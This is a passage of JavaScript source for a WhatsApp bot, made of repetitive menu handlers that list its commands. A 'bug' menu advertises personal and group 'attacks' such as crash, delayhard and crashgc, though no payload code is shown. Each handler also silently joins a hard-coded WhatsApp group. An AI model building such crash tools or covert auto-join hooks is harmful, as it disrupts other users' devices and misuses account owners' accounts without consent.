│❖ ${prefix}programming
│❖ ${prefix}pubg
│❖ ${prefix}randblackpink
│❖ ${prefix}randomnime
│❖ ${prefix}randomnime2
│❖ ${prefix}rize
│❖ ${prefix}rose
│❖ ${prefix}ryujin
│❖ ${prefix}sagiri
│❖ ${prefix}sakura
│❖ ${prefix}sasuke
│❖ ${prefix}satanic
│❖ ${prefix}sfw
│❖ ${prefix}shina
│❖ ${prefix}shinka
│❖ ${prefix}shinomiya
│❖ ${prefix}shizuka
│❖ ${prefix}shota
│❖ ${prefix}shortquote
│❖ ${prefix}space
│❖ ${prefix}technology
│❖ ${prefix}tejina
│❖ ${prefix}toukachan
│❖ ${prefix}tsunade
│❖ ${prefix}waifu
│❖ ${prefix}wallhp
│❖ ${prefix}wallml
│❖ ${prefix}wallmlnime
│❖ ${prefix}yotsuba
│❖ ${prefix}yuki
│❖ ${prefix}yulibocil
│❖ ${prefix}yumeko
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'bugmenu':
case 'CYBERbug': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

 ┏━━◆ *CYBER - 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒* ◆━━┓
│
│ ◈ *𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}crash
│❖ ${prefix}blank
│❖ ${prefix}delay
│❖ ${prefix}delayhard
│❖ ${prefix}cyberinvis
│❖ ${prefix}cyberclose
│❖ ${prefix}bruteclose
│❖ ${prefix}metaclose
│❖ ${prefix}close-zapp
│❖ ${prefix}cyber-destroy
│
│ ◈ *𝗡𝗘𝗪 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}ultrabug
│❖ ${prefix}megabug
│❖ ${prefix}ghostcrash
│❖ ${prefix}superlag
│❖ ${prefix}terminator
│❖ ${prefix}shadowbug
│❖ ${prefix}nukeattack
│❖ ${prefix}godmode
│❖ ${prefix}killswitch
│❖ ${prefix}quantumbug
│
│ ◈ *𝗚𝗥𝗢𝗨𝗣 𝗔𝗧𝗧𝗔𝗖𝗞𝗦*
│❖ ${prefix}buggc
│❖ ${prefix}xgroup
│❖ ${prefix}crashgc
│❖ ${prefix}blankgc
│❖ ${prefix}cyberkillgc
│
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'downloadmenu':
case 'CYBERdownload': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'funmenu':
case 'CYBERfun': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'gamemenu':
case 'CYBERgame': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by ❖ 𝐂𝐘𝐁𝐄𝐑 𝐒𝐄𝐂 𝐏𝐑𝐎 ❖* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'groupmenu':
case 'CYBERgroup': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}add
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antilinkkick
│❖ ${prefix}antilinkwarn
│❖ ${prefix}antilinkgc
│❖ ${prefix}antilinkgckick
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}antitagwarn
│❖ ${prefix}antitagadmin
│❖ ${prefix}antitagadminwarn
│❖ ${prefix}antigroupmention
│❖ ${prefix}antigroupmentionkick
│❖ ${prefix}antigroupmentionwarn
│❖ ${prefix}closetime
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gcsettings
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}resetlink
│❖ ${prefix}revoke
│❖ ${prefix}setdesc
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
│❖ ${prefix}warn
│❖ ${prefix}warnlimit
│❖ ${prefix}warns
│❖ ${prefix}resetwarn
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'logomenu':
case 'CYBERlogo': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐋𝐎𝐆𝐎* ◆━━┓
│❖ ${prefix}advancedglow
│❖ ${prefix}blackpinklogo
│❖ ${prefix}blackpinkstyle
│❖ ${prefix}cartoonstyle
│❖ ${prefix}deletingtext
│❖ ${prefix}effectclouds
│❖ ${prefix}flag3dtext
│❖ ${prefix}flagtext
│❖ ${prefix}freecreate
│❖ ${prefix}galaxystyle
│❖ ${prefix}galaxywallpaper
│❖ ${prefix}gfx
│❖ ${prefix}gfx10
│❖ ${prefix}gfx11
│❖ ${prefix}gfx12
│❖ ${prefix}gfx2
│❖ ${prefix}gfx3
│❖ ${prefix}gfx4
│❖ ${prefix}gfx5
│❖ ${prefix}gfx6
│❖ ${prefix}gfx7
│❖ ${prefix}gfx8
│❖ ${prefix}gfx9
│❖ ${prefix}glitchtext
│❖ ${prefix}glowingtext
│❖ ${prefix}gradienttext
│❖ ${prefix}lighteffects
│❖ ${prefix}logomaker
│❖ ${prefix}luxurygold
│❖ ${prefix}makingneon
│❖ ${prefix}multicoloredneon
│❖ ${prefix}neonglitch
│❖ ${prefix}papercutstyle
│❖ ${prefix}pixelglitch
│❖ ${prefix}royaltext
│❖ ${prefix}sandsummer
│❖ ${prefix}style1917
│❖ ${prefix}summerbeach
│❖ ${prefix}typographytext
│❖ ${prefix}underwatertext
│❖ ${prefix}watercolortext
│❖ ${prefix}writetext
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by GAME CHANGER* | © 2026
`;

    // TRY-CATCH for image sending with fallback to text only
    try {
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                image: { url: randomImage },
                caption: menuText
            }), 
            { quoted: m }
        );
    } catch (imageError) {
        console.log('❌ Menu image failed, sending text only:', imageError.message);
        await devtrust.sendMessage(from, 
            addNewsletterContext({
                text: menuText
            }), 
            { quoted: m }
        );
    }
}
break;

case 'ownermenu':
case 'CYBERowner': {
    await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐎𝐖𝐍𝐄𝐑* ◆━━┓
│❖ .
│❖ ${prefix}addsudo
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antidelete
│❖ ${prefix}antiedit
│❖ ${prefix}anticall
│❖ ${prefix}autobio
│❖ ${prefix}autoreact
│❖ ${prefix}autoread
│❖ ${prefix}autorecording
│❖ ${prefix}autorecordtype
│❖ ${prefix}autoreactstatusdelay
│❖ ${prefix}autoreply
│❖ ${prefix}autotyping
│❖ ${prefix}autoviewstatus
│❖ ${prefix}autoviewstatusdelay
│❖ ${prefix}ban
│❖ ${prefix}banuser
│❖ ${prefix}banuser1
│❖ ${prefix}block
│❖ ${prefix}broadcast
│❖ ${prefix}config
│❖ ${prefix}delanticallmsg
│❖ ${prefix}delsudo
│❖ ${prefix}getsudo
│❖ ${prefix}listban
│❖ ${prefix}listbanuser
│❖ ${prefix}listsudo
│❖ ${prefix}locksettings
│❖ ${prefix}private
│❖ ${prefix}public
│❖ ${prefix}self
│❖ ${prefix}set
│❖ ${prefix}setanticallmsg
│❖ ${prefix}setpp
│❖ ${prefix}setsudo
│❖ ${prefix}setprefix
